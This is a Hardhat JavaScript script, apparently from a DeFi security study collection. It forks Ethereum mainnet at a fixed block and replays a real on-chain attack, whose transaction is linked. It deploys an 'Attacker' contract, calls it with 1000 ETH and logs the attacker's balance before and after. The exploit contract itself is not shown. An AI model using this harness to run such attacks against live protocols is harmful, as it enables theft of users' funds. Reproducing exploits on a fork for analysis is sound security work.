const {network, ethers} = require("hardhat");
const hre = require("hardhat");


async function main() {
  // fork the mainnet, blockheight: 17740954
  // 链上攻击案例：
  // https://explorer.phalcon.xyz/tx/eth/0x8b74995d1d61d3d7547575649136b8765acb22882960f0636941c44ec7bbe146
  //
  await hre.network.provider.request({
      method: "hardhat_reset",
      params: [{
          forking: {
              jsonRpcUrl:"https://rpc.ankr.com/eth",
              blockNumber: 17740954
          }
      }]
  })

  // import vars
  const [attacker] = await ethers.getSigners();
  const attackerAddress = await attacker.getAddress();
  console.log("attacker address:", attackerAddress);

  // deplay the attack contract
  const attackContract = await ethers.deployContract("Attacker");
  const attackContractAddress = await attackContract.getAddress();
  console.log("attack contract address:", attackContractAddress);

  //
  // 执行
  //
  const attackerBalanceBefore = await ethers.provider.getBalance(attackerAddress);
  console.log("ETH Balance of Attacker (Before) = ", ethers.formatEther(attackerBalanceBefore));
  //
  const attackTx = await attackContract.execution({
    value: ethers.parseEther("1000.0")
  });
  console.log(`attack tx hash: ${attackTx.hash}`);

  const attackReceipt = await attackTx.wait();
  console.log("attack tx receipt: ", attackReceipt.logs);

  //
  const attackerBalanceAfter = await ethers.provider.getBalance(attackerAddress);
  console.log("ETH Balance of Attacker (After) = ", ethers.formatEther(attackerBalanceAfter));
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
